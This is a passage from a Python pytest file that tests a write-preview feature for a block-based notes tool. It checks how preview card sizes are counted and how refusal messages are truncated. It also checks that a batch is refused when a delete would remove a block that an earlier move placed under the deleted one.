    r = _refusal("batch", raw, blocks)
    assert "the card would hold" in r.message


def test_every_refusal_is_bounded(monkeypatch):
    monkeypatch.setattr(wp_module, "_build",
                        lambda *a: Refusal("x" * 10_000))
    r = _refusal("save_note", {"text": "t"})
    assert r.message == "x" * 500 + "… (10,000 characters)"


# -- each part of the card size, and both limits' boundaries ---------------

def _size(short: str, raw: Mapping[str, object],
          blocks: Mapping[BlockUid, StoredBlock] = {}) -> int:
    """The size the card for this call counts, read off the refusal a
    zero limit gives every card."""
    out = build_write_preview(short, raw, blocks)
    assert isinstance(out, Refusal), out
    prefix = f"{short}: the card would hold "
    assert out.message.startswith(prefix), out.message
    return int(out.message[len(prefix):].split(" ")[0].replace(",", ""))


def test_string_targets_count_toward_the_card_size(monkeypatch):
    monkeypatch.setattr(wp_module, "PREVIEW_LIMIT_CHARS", 0)
    # title 10 + new_title 20; allow_merge is a bool, not a string
    assert _size("rename_page", {"title": "T" * 10,
                                 "new_title": "U" * 20}) == 30


def test_warnings_count_toward_the_card_size(monkeypatch):
    raw = {"commands": [{"command": "update",
                         "params": {"uid": _A, "text": "t"}}]}
    (warning,) = _preview("batch", raw).ops[0].warnings
    monkeypatch.setattr(wp_module, "PREVIEW_LIMIT_CHARS", 0)
    # uid 8 + text 1 + the missing-uid warning; a missing block adds none
    assert _size("batch", raw) == 8 + 1 + len(warning)


def test_a_created_blocks_alias_counts_toward_the_card_size(monkeypatch):
    monkeypatch.setattr(wp_module, "PREVIEW_LIMIT_CHARS", 0)
    name = "n" * 40
    raw = {"commands": [
        {"command": "create", "params": {"page": "P", "text": "a",
                                         "as": name}},
        {"command": "update", "params": {"uid": f"{{{{{name}}}}}",
                                         "text": "b"}}]}
    # create: page 1 + as 40 + text 1; update: uid 44 + text 1 + alias 40
    assert _size("batch", raw) == 42 + 45 + 40


def test_a_found_blocks_page_and_excerpt_count_toward_the_card_size(
        monkeypatch):
    monkeypatch.setattr(wp_module, "PREVIEW_LIMIT_CHARS", 0)
    raw = {"uid": _VICTIM, "text": "abc"}
    # uid 11 + text 3 + page 5 + the 200-character excerpt, not the 300
    assert _size("update_block", raw,
                 {_VICTIM: StoredBlock(_INBOX, "y" * 300)}) == 219


def test_a_deletes_descendants_count_toward_the_card_size(monkeypatch):
    monkeypatch.setattr(wp_module, "PREVIEW_LIMIT_CHARS", 0)
    raw = {"commands": [{"command": "delete", "params": {"uid": _A}}]}
    # uid 8 + page 5 + excerpt 3 + the count's 5 digits
    assert _size("batch", raw, {_A: StoredBlock(_INBOX, "old", 12345)}) \
        == 21


def test_moves_with_long_targets_are_refused_by_the_card_size():
    page = "p" * TARGET_LIMIT_CHARS
    raw = {"commands": [
        {"command": "move", "params": {"uid": uid_of(f"MOVE{i:06d}"),
                                       "page": page}}
        for i in range(300)]}
    r = _refusal("batch", raw)
    assert "the card would hold" in r.message


def test_a_card_exactly_at_the_size_limit_is_previewed(monkeypatch):
    raw = {"title": "T" * 10, "new_title": "U" * 20}
    monkeypatch.setattr(wp_module, "PREVIEW_LIMIT_CHARS", 30)
    assert _preview("rename_page", raw)
    monkeypatch.setattr(wp_module, "PREVIEW_LIMIT_CHARS", 29)
    assert "the card would hold 30 characters" in _refusal(
        "rename_page", raw).message


def test_a_refusal_exactly_at_the_cut_is_whole(monkeypatch):
    monkeypatch.setattr(wp_module, "_build",
                        lambda *a: Refusal("x" * 500))
    assert _refusal("save_note", {"text": "t"}).message == "x" * 500
    monkeypatch.setattr(wp_module, "_build",
                        lambda *a: Refusal("x" * 501))
    assert _refusal("save_note", {"text": "t"}).message \
        == "x" * 500 + "… (501 characters)"


# -- a delete must not take an existing block an earlier write moved in ----

_T = uid_of("TARGET0001")
_KID = uid_of("TARGETKID1")
_MOVED = uid_of("MOVEDROOT1")
_ELSE = uid_of("ELSEWHERE1")
_TOP = uid_of("TOPOFPAGE1")


def _move(spec: str, parent: str | None = None) -> dict[str, object]:
    params: dict[str, object] = {"uid": spec, "page": "P"}
    if parent is not None:
        params["parent"] = parent
    return {"command": "move", "params": params}


def _delete(spec: str) -> dict[str, object]:
    return {"command": "delete", "params": {"uid": spec}}


def _create(alias: str, parent: str | None = None) -> dict[str, object]:
    params: dict[str, object] = {"page": "P", "text": "x", "as": alias}
    if parent is not None:
        params["parent"] = parent
    return {"command": "create", "params": params}


# What the reader holds: the delete target, a block under it, and a block
# elsewhere, each with its ancestors parent first.
_TREE = {
    _T: StoredBlock(_INBOX, "target", 1, ancestors=(_TOP,)),
    _KID: StoredBlock(_INBOX, "kid", ancestors=(_T, _TOP)),
    _ELSE: StoredBlock(_INBOX, "else", ancestors=()),
    _TOP: StoredBlock(_INBOX, "top", ancestors=()),
}


def _moved_in(write: int, delete: int, spec: str) -> str:
    return (f"batch: write {delete} deletes {json.dumps(spec)} and every "
            f"block under it, and write {write} moves an existing block "
            "there first, so it would be deleted too; move it elsewhere or "
            "split the batch")


def _cannot_tell(write: int, delete: int, spec: str) -> str:
    return (f"batch: write {delete} deletes {json.dumps(spec)} and every "
            f"block under it, and the card cannot tell whether write "
            f"{write} moves an existing block there first; split the batch")


def test_a_delete_of_the_block_a_move_went_under_is_refused():
    raw = {"commands": [_move(_MOVED, f"(({_T}))"), _delete(_T)]}
    assert _refusal("batch", raw, _TREE).message == _moved_in(1, 2, _T)


def test_a_delete_of_an_alias_a_move_went_under_is_refused():
    raw = {"commands": [_create("t"), _move(_MOVED, "{{t}}"),
                        _delete("{{t}}")]}
    assert _refusal("batch", raw, _TREE).message \
        == _moved_in(2, 3, "{{t}}")


def test_a_move_under_a_block_inside_the_deleted_subtree_is_refused():
    raw = {"commands": [_move(_MOVED, f"(({_KID}))"), _delete(_T)]}
    assert _refusal("batch", raw, _TREE).message == _moved_in(1, 2, _T)


def test_a_move_under_a_block_created_inside_the_subtree_is_refused():
    raw = {"commands": [_create("c", f"(({_KID}))"),
                        _move(_MOVED, "{{c}}"), _delete(_T)]}
    assert _refusal("batch", raw, _TREE).message == _moved_in(2, 3, _T)


def test_a_block_moved_into_the_subtree_after_its_parent_is_refused():
    # the block lands under ELSEWHERE, which then moves under the target
    raw = {"commands": [_move(_MOVED, f"(({_ELSE}))"),
                        _move(_ELSE, f"(({_T}))"), _delete(_T)]}
    assert "would be deleted too" in _refusal("batch", raw, _TREE).message


def test_a_created_block_carrying_a_moved_one_into_the_subtree_is_refused():
    raw = {"commands": [_create("c"), _move(_MOVED, "{{c}}"),
                        _move("{{c}}", f"(({_T}))"), _delete(_T)]}
    assert _refusal("batch", raw, _TREE).message == _moved_in(2, 4, _T)


@pytest.mark.parametrize("commands", [
    pytest.param([_move(_MOVED, f"(({_ELSE}))"), _delete(_T)],
                 id="elsewhere"),
    pytest.param([_move(_MOVED), _delete(_T)], id="page top level"),
    pytest.param([_delete(_T), _move(_MOVED, f"(({_T}))")],
                 id="move after the delete"),
    pytest.param([_move(_KID, f"(({_ELSE}))"),
                  _move(_MOVED, f"(({_KID}))"), _delete(_T)],
                 id="its parent moved out first"),
    pytest.param([_move(_MOVED, f"(({_T}))"),
                  _move(_MOVED, f"(({_ELSE}))"), _delete(_T)],
                 id="moved in then out"),
    pytest.param([_move(_T, f"(({_ELSE}))"), _delete(_T)],
                 id="the target itself moves"),
    pytest.param([_create("c", f"(({_T}))"), _delete(_T)],
                 id="a create under it"),
])
def test_a_delete_no_moved_block_ends_under_is_previewed(commands):
    assert _preview("batch", {"commands": commands}, _TREE)


@pytest.mark.parametrize("commands", [
    pytest.param([_move(_MOVED, "## Done"), _delete(_T)],
                 id="a heading"),
    pytest.param([_move(_MOVED, "((GONEGONE01))"), _delete(_T)],
                 id="a uid the reader has no row for"),
    pytest.param([_move(_MOVED, "((no good))"), _delete(_T)],
                 id="a malformed uid"),
    pytest.param([_create("c", "## Done"), _move(_MOVED, "{{c}}"),
                  _delete(_T)], id="an alias under a heading"),
    pytest.param([_move(_MOVED, f"(({_ELSE}))"),
                  _move(_ELSE, f"(({_MOVED}))"), _delete(_T)],
                 id="a cycle"),
])
def test_a_move_the_card_cannot_place_before_a_delete_is_refused(commands):
    write = 2 if commands[0]["command"] == "create" else 1
    assert _refusal("batch", {"commands": commands}, _TREE).message \
        == _cannot_tell(write, len(commands), _T)


def test_a_block_read_without_ancestors_cannot_be_placed():
    raw = {"commands": [_move(_MOVED, f"(({_ELSE}))"), _delete(_T)]}
    blocks = {**_TREE, _ELSE: StoredBlock(_INBOX, "else")}
    assert _refusal("batch", raw, blocks).message \
        == _cannot_tell(1, 2, _T)


def test_ancestor_uids_are_the_parents_a_move_before_a_delete_needs():
    raw = {"commands": [_create("c", f"(({_KID}))"),
                        _create("d", f"(({_TOP}))"),
                        {"command": "create", "params": {
                            "page": "P", "text": "x",
                            "parent": "((NOALIAS01))"}},
                        _move(_MOVED, f"(({_ELSE}))"),
                        _move(_MOVED, "{{c}}"), _move(_MOVED, "## H"),
                        _move(_MOVED, "((no good))"), _delete(_T)]}
    assert ancestor_uids("batch", raw) == [_KID, _TOP, _ELSE]


@pytest.mark.parametrize("commands", [
    [_move(_MOVED, f"(({_ELSE}))")],
    [_delete(_T), _move(_MOVED, f"(({_ELSE}))")],
    [_create("c", f"(({_KID}))"), _delete(_T)],
])
def test_ancestor_uids_are_none_without_a_move_before_a_delete(commands):
    assert ancestor_uids("batch", {"commands": commands}) == []


def test_ancestor_uids_never_raise():
    assert ancestor_uids("batch", {"commands": "nope"}) == []
    assert ancestor_uids("update_block", {"uid": _A, "text": "t"}) == []
